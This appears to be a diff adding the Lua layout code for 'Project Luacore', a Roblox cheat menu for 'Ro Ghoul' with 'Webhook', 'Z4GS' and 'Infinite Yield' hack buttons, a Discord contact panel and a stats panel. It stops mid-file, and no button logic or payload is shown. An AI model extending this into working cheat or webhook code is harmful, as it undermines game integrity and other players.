@@ -1,1 +1,1632 @@
 
+
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local ToolBar = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local PLuacoreText = Instance.new("TextLabel")
+local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
+local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
+local Close = Instance.new("ImageButton")
+local UICorner_3 = Instance.new("UICorner")
+local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
+local raiwesy = Instance.new("TextLabel")
+local UIAspectRatioConstraint_3 = Instance.new("UIAspectRatioConstraint")
+local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
+local Minimize = Instance.new("ImageButton")
+local UICorner_4 = Instance.new("UICorner")
+local UIAspectRatioConstraint_4 = Instance.new("UIAspectRatioConstraint")
+local UIAspectRatioConstraint_5 = Instance.new("UIAspectRatioConstraint")
+local HacksFrame = Instance.new("Frame")
+local UICorner_5 = Instance.new("UICorner")
+local WHK = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
+local UIAspectRatioConstraint_6 = Instance.new("UIAspectRatioConstraint")
+local Z4GS = Instance.new("TextButton")
+local UICorner_7 = Instance.new("UICorner")
+local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
+local UIAspectRatioConstraint_7 = Instance.new("UIAspectRatioConstraint")
+local IYield = Instance.new("TextButton")
+local UICorner_8 = Instance.new("UICorner")
+local UITextSizeConstraint_5 = Instance.new("UITextSizeConstraint")
+local UIAspectRatioConstraint_8 = Instance.new("UIAspectRatioConstraint")
+local UIAspectRatioConstraint_9 = Instance.new("UIAspectRatioConstraint")
+local GameNameText = Instance.new("TextLabel")
+local UICorner_9 = Instance.new("UICorner")
+local UIAspectRatioConstraint_10 = Instance.new("UIAspectRatioConstraint")
+local UITextSizeConstraint_6 = Instance.new("UITextSizeConstraint")
+local Rejoin = Instance.new("TextButton")
+local UICorner_10 = Instance.new("UICorner")
+local UITextSizeConstraint_7 = Instance.new("UITextSizeConstraint")
+local UIAspectRatioConstraint_11 = Instance.new("UIAspectRatioConstraint")
+local UIAspectRatioConstraint_12 = Instance.new("UIAspectRatioConstraint")
+local ContactFrame = Instance.new("Frame")
+local UICorner_11 = Instance.new("UICorner")
+local DiscordFrame = Instance.new("Frame")
+local UICorner_12 = Instance.new("UICorner")
+local Discord = Instance.new("TextLabel")
+local UICorner_13 = Instance.new("UICorner")
+local UIAspectRatioConstraint_13 = Instance.new("UIAspectRatioConstraint")
+local UITextSizeConstraint_8 = Instance.new("UITextSizeConstraint")
+local CopyButton = Instance.new("TextButton")
+local UICorner_14 = Instance.new("UICorner")
+local UIGradient = Instance.new("UIGradient")
+local UIAspectRatioConstraint_14 = Instance.new("UIAspectRatioConstraint")
+local UITextSizeConstraint_9 = Instance.new("UITextSizeConstraint")
+local UIAspectRatioConstraint_15 = Instance.new("UIAspectRatioConstraint")
+local FounderFrame = Instance.new("Frame")
+local UICorner_15 = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local UICorner_16 = Instance.new("UICorner")
+local UIAspectRatioConstraint_16 = Instance.new("UIAspectRatioConstraint")
+local UITextSizeConstraint_10 = Instance.new("UITextSizeConstraint")
+local raiwesy_2 = Instance.new("Frame")
+local UICorner_17 = Instance.new("UICorner")
+local ImageLabel = Instance.new("ImageLabel")
+local UICorner_18 = Instance.new("UICorner")
+local UIAspectRatioConstraint_17 = Instance.new("UIAspectRatioConstraint")
+local FounderName = Instance.new("TextLabel")
+local UIAspectRatioConstraint_18 = Instance.new("UIAspectRatioConstraint")
+local UITextSizeConstraint_11 = Instance.new("UITextSizeConstraint")
+local UIAspectRatioConstraint_19 = Instance.new("UIAspectRatioConstraint")
+local UIAspectRatioConstraint_20 = Instance.new("UIAspectRatioConstraint")
+local UIAspectRatioConstraint_21 = Instance.new("UIAspectRatioConstraint")
+local Toolbar = Instance.new("Frame")
+local UICorner_19 = Instance.new("UICorner")
+local CULabel = Instance.new("TextLabel")
+local UITextSizeConstraint_12 = Instance.new("UITextSizeConstraint")
+local UIAspectRatioConstraint_22 = Instance.new("UIAspectRatioConstraint")
+local Close_2 = Instance.new("ImageButton")
+local UICorner_20 = Instance.new("UICorner")
+local UIAspectRatioConstraint_23 = Instance.new("UIAspectRatioConstraint")
+local UIAspectRatioConstraint_24 = Instance.new("UIAspectRatioConstraint")
+local StatsFrame = Instance.new("Frame")
+local UICorner_21 = Instance.new("UICorner")
+local UIAspectRatioConstraint_25 = Instance.new("UIAspectRatioConstraint")
+local PlayerName = Instance.new("TextLabel")
+local UITextSizeConstraint_13 = Instance.new("UITextSizeConstraint")
+local UIAspectRatioConstraint_26 = Instance.new("UIAspectRatioConstraint")
+local Stats = Instance.new("Frame")
+local UICorner_22 = Instance.new("UICorner")
+local RGSLabel = Instance.new("TextLabel")
+local UICorner_23 = Instance.new("UICorner")
+local UIAspectRatioConstraint_27 = Instance.new("UIAspectRatioConstraint")
+local UITextSizeConstraint_14 = Instance.new("UITextSizeConstraint")
+local LevelStat = Instance.new("TextLabel")
+local UICorner_24 = Instance.new("UICorner")
+local UIAspectRatioConstraint_28 = Instance.new("UIAspectRatioConstraint")
+local UITextSizeConstraint_15 = Instance.new("UITextSizeConstraint")
+local YenStat = Instance.new("TextLabel")
+local UICorner_25 = Instance.new("UICorner")
+local UIAspectRatioConstraint_29 = Instance.new("UIAspectRatioConstraint")
+local UITextSizeConstraint_16 = Instance.new("UITextSizeConstraint")
+local RepStat = Instance.new("TextLabel")
+local UICorner_26 = Instance.new("UICorner")
+local UIAspectRatioConstraint_30 = Instance.new("UIAspectRatioConstraint")
+local UITextSizeConstraint_17 = Instance.new("UITextSizeConstraint")
+local UIAspectRatioConstraint_31 = Instance.new("UIAspectRatioConstraint")
+local Toolbar_2 = Instance.new("Frame")
+local UICorner_27 = Instance.new("UICorner")
+local CULabel_2 = Instance.new("TextLabel")
+local UITextSizeConstraint_18 = Instance.new("UITextSizeConstraint")
+local UIAspectRatioConstraint_32 = Instance.new("UIAspectRatioConstraint")
+local Close_3 = Instance.new("ImageButton")
+local UICorner_28 = Instance.new("UICorner")
+local UIAspectRatioConstraint_33 = Instance.new("UIAspectRatioConstraint")
+local UIAspectRatioConstraint_34 = Instance.new("UIAspectRatioConstraint")
+local OpenButton = Instance.new("ImageButton")
+local UICorner_29 = Instance.new("UICorner")
+local UIAspectRatioConstraint_35 = Instance.new("UIAspectRatioConstraint")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MainFrame.BackgroundTransparency = 0.450
+MainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+MainFrame.BorderSizePixel = 0
+MainFrame.Position = UDim2.new(0.354254633, 0, 0.179016978, 0)
+MainFrame.Size = UDim2.new(0.290621936, 0, 0.641377032, 0)
+
+UICorner.CornerRadius = UDim.new(0, 12)
+UICorner.Parent = MainFrame
+
+ToolBar.Name = "ToolBar"
+ToolBar.Parent = MainFrame
+ToolBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ToolBar.BackgroundTransparency = 0.250
+ToolBar.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ToolBar.BorderSizePixel = 0
+ToolBar.Size = UDim2.new(0.999999881, 0, 0.134715006, 0)
+
+UICorner_2.CornerRadius = UDim.new(0, 6)
+UICorner_2.Parent = ToolBar
+
+PLuacoreText.Name = "PLuacoreText"
+PLuacoreText.Parent = ToolBar
+PLuacoreText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PLuacoreText.BackgroundTransparency = 1.000
+PLuacoreText.BorderColor3 = Color3.fromRGB(0, 0, 0)
+PLuacoreText.BorderSizePixel = 0
+PLuacoreText.Position = UDim2.new(0.0292686261, 0, 0.0192308128, 0)
+PLuacoreText.Size = UDim2.new(0.453658044, 0, 0.980769277, 0)
+PLuacoreText.Font = Enum.Font.IndieFlower
+PLuacoreText.Text = "Project Luacore"
+PLuacoreText.TextColor3 = Color3.fromRGB(255, 255, 255)
+PLuacoreText.TextScaled = true
+PLuacoreText.TextSize = 21.000
+PLuacoreText.TextWrapped = true
+PLuacoreText.TextXAlignment = Enum.TextXAlignment.Left
+
+UIAspectRatioConstraint.Parent = PLuacoreText
+UIAspectRatioConstraint.AspectRatio = 3.647
+
+UITextSizeConstraint.Parent = PLuacoreText
+UITextSizeConstraint.MaxTextSize = 21
+
+Close.Name = "Close"
+Close.Parent = ToolBar
+Close.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Close.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Close.BorderSizePixel = 0
+Close.Position = UDim2.new(0.899309099, 0, 0.159355536, 0)
+Close.Size = UDim2.new(0.0849124193, 0, 0.667922854, 0)
+Close.Image = "http://www.roblox.com/asset/?id=6031094678"
+Close.ScaleType = Enum.ScaleType.Fit
+
+UICorner_3.Parent = Close
+
+UIAspectRatioConstraint_2.Parent = Close
+UIAspectRatioConstraint_2.AspectRatio = 1.002
+
+raiwesy.Name = "raiwesy"
+raiwesy.Parent = ToolBar
+raiwesy.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+raiwesy.BackgroundTransparency = 1.000
+raiwesy.BorderColor3 = Color3.fromRGB(0, 0, 0)
+raiwesy.BorderSizePixel = 0
+raiwesy.Position = UDim2.new(0.336585373, 0, 0, 0)
+raiwesy.Size = UDim2.new(0.146341443, 0, 1.00000012, 0)
+raiwesy.Font = Enum.Font.Cartoon
+raiwesy.Text = "@raiwesy"
+raiwesy.TextColor3 = Color3.fromRGB(212, 212, 212)
+raiwesy.TextScaled = true
+raiwesy.TextSize = 15.000
+raiwesy.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+raiwesy.TextWrapped = true
+raiwesy.TextXAlignment = Enum.TextXAlignment.Left
+
+UIAspectRatioConstraint_3.Parent = raiwesy
+UIAspectRatioConstraint_3.AspectRatio = 1.154
+
+UITextSizeConstraint_2.Parent = raiwesy
+UITextSizeConstraint_2.MaxTextSize = 16
+
+Minimize.Name = "Minimize"
+Minimize.Parent = ToolBar
+Minimize.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Minimize.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Minimize.BorderSizePixel = 0
+Minimize.Position = UDim2.new(0.805000007, 0, 0.158999994, 0)
+Minimize.Size = UDim2.new(0.0849124193, 0, 0.667922854, 0)
+Minimize.Image = "http://www.roblox.com/asset/?id=6026568240"
+Minimize.ScaleType = Enum.ScaleType.Fit
+
+UICorner_4.Parent = Minimize
+
+UIAspectRatioConstraint_4.Parent = Minimize
+UIAspectRatioConstraint_4.AspectRatio = 1.002
+
+UIAspectRatioConstraint_5.Parent = ToolBar
+UIAspectRatioConstraint_5.AspectRatio = 7.885
+
+HacksFrame.Name = "HacksFrame"
+HacksFrame.Parent = MainFrame
+HacksFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+HacksFrame.BackgroundTransparency = 0.500
+HacksFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+HacksFrame.BorderSizePixel = 0
+HacksFrame.Position = UDim2.new(0.117073171, 0, 0.33765161, 0)
+HacksFrame.Size = UDim2.new(0.763414562, 0, 0.510362685, 0)
+
+UICorner_5.CornerRadius = UDim.new(0, 12)
+UICorner_5.Parent = HacksFrame
+
+WHK.Name = "WHK"
+WHK.Parent = HacksFrame
+WHK.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+WHK.BorderColor3 = Color3.fromRGB(0, 0, 0)
+WHK.BorderSizePixel = 0
+WHK.Position = UDim2.new(0.0901639387, 0, 0.395356625, 0)
+WHK.Size = UDim2.new(0.819672108, 0, 0.204918012, 0)
+WHK.Font = Enum.Font.Unknown
+WHK.Text = "Webhook"
+WHK.TextColor3 = Color3.fromRGB(255, 255, 255)
+WHK.TextScaled = true
+WHK.TextSize = 14.000
+WHK.TextWrapped = true
+
+UICorner_6.CornerRadius = UDim.new(0, 5)
+UICorner_6.Parent = WHK
+
+UITextSizeConstraint_3.Parent = WHK
+UITextSizeConstraint_3.MaxTextSize = 14
+
+UIAspectRatioConstraint_6.Parent = WHK
+UIAspectRatioConstraint_6.AspectRatio = 6.355
+
+Z4GS.Name = "Z4GS"
+Z4GS.Parent = HacksFrame
+Z4GS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Z4GS.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Z4GS.BorderSizePixel = 0
+Z4GS.Position = UDim2.new(0.0901639387, 0, 0.153553292, 0)
+Z4GS.Size = UDim2.new(0.819672108, 0, 0.204918012, 0)
+Z4GS.Font = Enum.Font.Unknown
+Z4GS.Text = "Z4GS"
+Z4GS.TextColor3 = Color3.fromRGB(255, 255, 255)
+Z4GS.TextScaled = true
+Z4GS.TextSize = 14.000
+Z4GS.TextWrapped = true
+
+UICorner_7.CornerRadius = UDim.new(0, 5)
+UICorner_7.Parent = Z4GS
+
+UITextSizeConstraint_4.Parent = Z4GS
+UITextSizeConstraint_4.MaxTextSize = 14
+
+UIAspectRatioConstraint_7.Parent = Z4GS
+UIAspectRatioConstraint_7.AspectRatio = 6.355
+
+IYield.Name = "IYield"
+IYield.Parent = HacksFrame
+IYield.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+IYield.BorderColor3 = Color3.fromRGB(0, 0, 0)
+IYield.BorderSizePixel = 0
+IYield.Position = UDim2.new(0.0901639387, 0, 0.640884459, 0)
+IYield.Size = UDim2.new(0.819672227, 0, 0.205000013, 0)
+IYield.Font = Enum.Font.Unknown
+IYield.Text = "Infinite Yield"
+IYield.TextColor3 = Color3.fromRGB(255, 255, 255)
+IYield.TextScaled = true
+IYield.TextSize = 14.000
+IYield.TextWrapped = true
+
+UICorner_8.CornerRadius = UDim.new(0, 5)
+UICorner_8.Parent = IYield
+
+UITextSizeConstraint_5.Parent = IYield
+UITextSizeConstraint_5.MaxTextSize = 14
+
+UIAspectRatioConstraint_8.Parent = IYield
+UIAspectRatioConstraint_8.AspectRatio = 6.353
+
+UIAspectRatioConstraint_9.Parent = HacksFrame
+UIAspectRatioConstraint_9.AspectRatio = 1.589
+
+GameNameText.Name = "GameNameText"
+GameNameText.Parent = MainFrame
+GameNameText.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+GameNameText.BackgroundTransparency = 0.500
+GameNameText.BorderColor3 = Color3.fromRGB(0, 0, 0)
+GameNameText.BorderSizePixel = 0
+GameNameText.Position = UDim2.new(0.256097555, 0, 0.171014488, 0)
+GameNameText.Size = UDim2.new(0.4878048, 0, 0.129533663, 0)
+GameNameText.Font = Enum.Font.Unknown
+GameNameText.Text = "Ro Ghoul"
+GameNameText.TextColor3 = Color3.fromRGB(255, 255, 255)
+GameNameText.TextScaled = true
+GameNameText.TextSize = 21.000
+GameNameText.TextWrapped = true
+
+UICorner_9.CornerRadius = UDim.new(0, 12)
+UICorner_9.Parent = GameNameText
+
+UIAspectRatioConstraint_10.Parent = GameNameText
+UIAspectRatioConstraint_10.AspectRatio = 4.000
+
+UITextSizeConstraint_6.Parent = GameNameText
+UITextSizeConstraint_6.MaxTextSize = 21
+
+Rejoin.Name = "Rejoin"
+Rejoin.Parent = MainFrame
+Rejoin.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Rejoin.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Rejoin.BorderSizePixel = 0
+Rejoin.Position = UDim2.new(0.419432193, 0, 0.865988553, 0)
+Rejoin.Size = UDim2.new(0.158696458, 0, 0.0939424261, 0)
+Rejoin.Font = Enum.Font.Unknown
+Rejoin.Text = "Rejoin"
+Rejoin.TextColor3 = Color3.fromRGB(255, 255, 255)
+Rejoin.TextScaled = true
+Rejoin.TextSize = 14.000
+Rejoin.TextWrapped = true
+
+UICorner_10.CornerRadius = UDim.new(0, 12)
+UICorner_10.Parent = Rejoin
+
+UITextSizeConstraint_7.Parent = Rejoin
+UITextSizeConstraint_7.MaxTextSize = 14
+
+UIAspectRatioConstraint_11.Parent = Rejoin
+UIAspectRatioConstraint_11.AspectRatio = 1.794
+
+UIAspectRatioConstraint_12.Parent = MainFrame
+UIAspectRatioConstraint_12.AspectRatio = 1.062
+
+ContactFrame.Name = "ContactFrame"
+ContactFrame.Parent = MainFrame
+ContactFrame.AnchorPoint = Vector2.new(0.5, 0)
+ContactFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ContactFrame.BackgroundTransparency = 0.500
+ContactFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ContactFrame.BorderSizePixel = 0
+ContactFrame.Position = UDim2.new(1.3313899, 0, 0.19559072, 0)
+ContactFrame.Size = UDim2.new(0.617476404, 0, 0.622312725, 0)
+
+UICorner_11.CornerRadius = UDim.new(0, 12)
+UICorner_11.Parent = ContactFrame
+
+DiscordFrame.Name = "DiscordFrame"
+DiscordFrame.Parent = ContactFrame
+DiscordFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+DiscordFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+DiscordFrame.BackgroundTransparency = 0.300
+DiscordFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+DiscordFrame.BorderSizePixel = 0
+DiscordFrame.Position = UDim2.new(0.5, 0, 0.377450973, 0)
+DiscordFrame.Size = UDim2.new(0.874418616, 0, 0.196078435, 0)
+
+UICorner_12.CornerRadius = UDim.new(0, 5)
+UICorner_12.Parent = DiscordFrame
+
+Discord.Name = "Discord"
+Discord.Parent = DiscordFrame
+Discord.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+Discord.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Discord.BorderSizePixel = 0
+Discord.Size = UDim2.new(0.606382966, 0, 0.974999964, 0)
+Discord.Font = Enum.Font.Unknown
+Discord.Text = "Discord"
+Discord.TextColor3 = Color3.fromRGB(255, 255, 255)
+Discord.TextScaled = true
+Discord.TextSize = 14.000
+Discord.TextWrapped = true
+
+UICorner_13.CornerRadius = UDim.new(0, 5)
+UICorner_13.Parent = Discord
+
+UIAspectRatioConstraint_13.Parent = Discord
+UIAspectRatioConstraint_13.AspectRatio = 2.923
+
+UITextSizeConstraint_8.Parent = Discord
+UITextSizeConstraint_8.MaxTextSize = 14
+
+CopyButton.Name = "CopyButton"
+CopyButton.Parent = DiscordFrame
+CopyButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CopyButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+CopyButton.BorderSizePixel = 0
+CopyButton.Position = UDim2.new(0.658115447, 0, 0.107775114, 0)
+CopyButton.Size = UDim2.new(0.308510631, 0, 0.775000036, 0)
+CopyButton.Font = Enum.Font.FredokaOne
+CopyButton.Text = "Copy"
+CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CopyButton.TextScaled = true
+CopyButton.TextSize = 14.000
+CopyButton.TextStrokeTransparency = 0.000
+CopyButton.TextWrapped = true
+
+UICorner_14.CornerRadius = UDim.new(0, 5)
+UICorner_14.Parent = CopyButton
+
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(26, 179, 15)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(187, 255, 0))}
+UIGradient.Parent = CopyButton
+
+UIAspectRatioConstraint_14.Parent = CopyButton
+UIAspectRatioConstraint_14.AspectRatio = 1.871
+
+UITextSizeConstraint_9.Parent = CopyButton
+UITextSizeConstraint_9.MaxTextSize = 14
+
+UIAspectRatioConstraint_15.Parent = DiscordFrame
+UIAspectRatioConstraint_15.AspectRatio = 4.700
+
+FounderFrame.Name = "FounderFrame"
+FounderFrame.Parent = ContactFrame
+FounderFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+FounderFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+FounderFrame.BackgroundTransparency = 0.300
+FounderFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+FounderFrame.BorderSizePixel = 0
+FounderFrame.Position = UDim2.new(0.5, 0, 0.724460244, 0)
+FounderFrame.Size = UDim2.new(0.874418557, 0, 0.387254894, 0)
+
+UICorner_15.CornerRadius = UDim.new(0, 5)
+UICorner_15.Parent = FounderFrame
+
+TextLabel.Parent = FounderFrame
+TextLabel.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0, 0, -0.0066863969, 0)
+TextLabel.Size = UDim2.new(1, 0, 0.303797454, 0)
+TextLabel.Font = Enum.Font.FredokaOne
+TextLabel.Text = "Founder"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+UICorner_16.CornerRadius = UDim.new(0, 5)
+UICorner_16.Parent = TextLabel
+
+UIAspectRatioConstraint_16.Parent = TextLabel
+UIAspectRatioConstraint_16.AspectRatio = 7.833
+
+UITextSizeConstraint_10.Parent = TextLabel
+UITextSizeConstraint_10.MaxTextSize = 14
+
+raiwesy_2.Name = "raiwesy"
+raiwesy_2.Parent = FounderFrame
+raiwesy_2.AnchorPoint = Vector2.new(0.5, 0.5)
+raiwesy_2.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
+raiwesy_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+raiwesy_2.BorderSizePixel = 0
+raiwesy_2.Position = UDim2.new(0.49661094, 0, 0.626582265, 0)
+raiwesy_2.Size = UDim2.new(0.617021263, 0, 0.481012642, 0)
+
+UICorner_17.CornerRadius = UDim.new(0, 5)
+UICorner_17.Parent = raiwesy_2
+
+ImageLabel.Parent = raiwesy_2
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(0.0460000001, 0, 0.0900000036, 0)
+ImageLabel.Size = UDim2.new(0.275862068, 0, 0.842105269, 0)
+ImageLabel.Image = "rbxassetid://16578138757"
+ImageLabel.ScaleType = Enum.ScaleType.Crop
+
+UICorner_18.CornerRadius = UDim.new(0, 90)
+UICorner_18.Parent = ImageLabel
+
+UIAspectRatioConstraint_17.Parent = ImageLabel
+
+FounderName.Name = "FounderName"
+FounderName.Parent = raiwesy_2
+FounderName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+FounderName.BackgroundTransparency = 1.000
+FounderName.BorderColor3 = Color3.fromRGB(0, 0, 0)
+FounderName.BorderSizePixel = 0
+FounderName.Position = UDim2.new(0.323448449, 0, 0.184315726, 0)
+FounderName.Size = UDim2.new(0.594827533, 0, 0.578947306, 0)
+FounderName.Font = Enum.Font.FredokaOne
+FounderName.Text = "@raiwesy"
+FounderName.TextColor3 = Color3.fromRGB(255, 255, 255)
+FounderName.TextScaled = true
+FounderName.TextSize = 14.000
+FounderName.TextWrapped = true
+
+UIAspectRatioConstraint_18.Parent = FounderName
+UIAspectRatioConstraint_18.AspectRatio = 3.136
+
+UITextSizeConstraint_11.Parent = FounderName
+UITextSizeConstraint_11.MaxTextSize = 14
+
+UIAspectRatioConstraint_19.Parent = raiwesy_2
+UIAspectRatioConstraint_19.AspectRatio = 3.053
+
+UIAspectRatioConstraint_20.Parent = FounderFrame
+UIAspectRatioConstraint_20.AspectRatio = 2.380
+
+UIAspectRatioConstraint_21.Parent = ContactFrame
+UIAspectRatioConstraint_21.AspectRatio = 1.054
+
+Toolbar.Name = "Toolbar"
+Toolbar.Parent = ContactFrame
+Toolbar.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+Toolbar.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Toolbar.BorderSizePixel = 0
+Toolbar.Position = UDim2.new(2.95242444e-07, 0, -0.00509785116, 0)
+Toolbar.Size = UDim2.new(1.0013113, 0, 0.249806151, 0)
+
+UICorner_19.CornerRadius = UDim.new(0, 5)
+UICorner_19.Parent = Toolbar
+
+CULabel.Name = "CULabel"
+CULabel.Parent = Toolbar
+CULabel.AnchorPoint = Vector2.new(0.5, 0)
+CULabel.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+CULabel.BackgroundTransparency = 1.000
+CULabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+CULabel.BorderSizePixel = 0
+CULabel.Position = UDim2.new(0.451233506, 0, -0.00663103396, 0)
+CULabel.Size = UDim2.new(0.622273743, 0, 1.00819135, 0)
+CULabel.Font = Enum.Font.FredokaOne
+CULabel.Text = "Contact Us"
+CULabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+CULabel.TextScaled = true
+CULabel.TextSize = 23.000
+CULabel.TextWrapped = true
+
+UITextSizeConstraint_12.Parent = CULabel
+UITextSizeConstraint_12.MaxTextSize = 23
+
+UIAspectRatioConstraint_22.Parent = CULabel
+UIAspectRatioConstraint_22.AspectRatio = 2.607
+
+Close_2.Name = "Close"
+Close_2.Parent = Toolbar
+Close_2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Close_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Close_2.BorderSizePixel = 0
+Close_2.Position = UDim2.new(0.799616277, 0, 0.144999608, 0)
+Close_2.Size = UDim2.new(0.165351391, 0, 0.694148183, 0)
+Close_2.Image = "http://www.roblox.com/asset/?id=6031094678"
+Close_2.ScaleType = Enum.ScaleType.Fit
+
+UICorner_20.Parent = Close_2
+
+UIAspectRatioConstraint_23.Parent = Close_2
+UIAspectRatioConstraint_23.AspectRatio = 1.006
+
+UIAspectRatioConstraint_24.Parent = Toolbar
+UIAspectRatioConstraint_24.AspectRatio = 4.224
+
+StatsFrame.Name = "StatsFrame"
+StatsFrame.Parent = MainFrame
+StatsFrame.AnchorPoint = Vector2.new(0.5, 0)
+StatsFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+StatsFrame.BackgroundTransparency = 0.500
+StatsFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+StatsFrame.BorderSizePixel = 0
+StatsFrame.Position = UDim2.new(-0.329630315, 0, 0.19559072, 0)
+StatsFrame.Size = UDim2.new(0.617476404, 0, 0.622312725, 0)
+
+UICorner_21.CornerRadius = UDim.new(0, 12)
+UICorner_21.Parent = StatsFrame
+
+UIAspectRatioConstraint_25.Parent = StatsFrame
+UIAspectRatioConstraint_25.AspectRatio = 1.054
+
+PlayerName.Name = "PlayerName"
+PlayerName.Parent = StatsFrame
+PlayerName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PlayerName.BackgroundTransparency = 1.000
+PlayerName.BorderColor3 = Color3.fromRGB(0, 0, 0)
+PlayerName.BorderSizePixel = 0
+PlayerName.Position = UDim2.new(3.67140913e-08, 0, 0.243440166, 0)
+PlayerName.Size = UDim2.new(0.996123135, 0, 0.106505074, 0)
+PlayerName.Font = Enum.Font.FredokaOne
+PlayerName.Text = "-PlayerName-"
+PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
+PlayerName.TextScaled = true
+PlayerName.TextSize = 17.000
+PlayerName.TextWrapped = true
+
+UITextSizeConstraint_13.Parent = PlayerName
+UITextSizeConstraint_13.MaxTextSize = 17
+
+UIAspectRatioConstraint_26.Parent = PlayerName
+UIAspectRatioConstraint_26.AspectRatio = 9.857
+
+Stats.Name = "Stats"
+Stats.Parent = StatsFrame
+Stats.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Stats.BackgroundTransparency = 0.300
+Stats.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Stats.BorderSizePixel = 0
+Stats.Position = UDim2.new(0.0577463098, 0, 0.370231926, 0)
+Stats.Size = UDim2.new(0.875818431, 0, 0.583242059, 0)
+
+UICorner_22.CornerRadius = UDim.new(0, 5)
+UICorner_22.Parent = Stats
+
+RGSLabel.Name = "RGSLabel"
+RGSLabel.Parent = Stats
+RGSLabel.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+RGSLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+RGSLabel.BorderSizePixel = 0
+RGSLabel.Position = UDim2.new(0, 0, -0.00668626418, 0)
+RGSLabel.Size = UDim2.new(1, 0, 0.202035144, 0)
+RGSLabel.Font = Enum.Font.FredokaOne
+RGSLabel.Text = "Ro Ghoul Stats"
+RGSLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+RGSLabel.TextScaled = true
+RGSLabel.TextSize = 14.000
+RGSLabel.TextWrapped = true
+
+UICorner_23.CornerRadius = UDim.new(0, 5)
+UICorner_23.Parent = RGSLabel
+
+UIAspectRatioConstraint_27.Parent = RGSLabel
+UIAspectRatioConstraint_27.AspectRatio = 7.833
+
+UITextSizeConstraint_14.Parent = RGSLabel
+UITextSizeConstraint_14.MaxTextSize = 14
+
+LevelStat.Name = "LevelStat"
+LevelStat.Parent = Stats
+LevelStat.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
+LevelStat.BorderColor3 = Color3.fromRGB(0, 0, 0)
+LevelStat.BorderSizePixel = 0
+LevelStat.Position = UDim2.new(0.214285716, 0, 0.275134265, 0)
+LevelStat.Size = UDim2.new(0.565934062, 0, 0.191304341, 0)
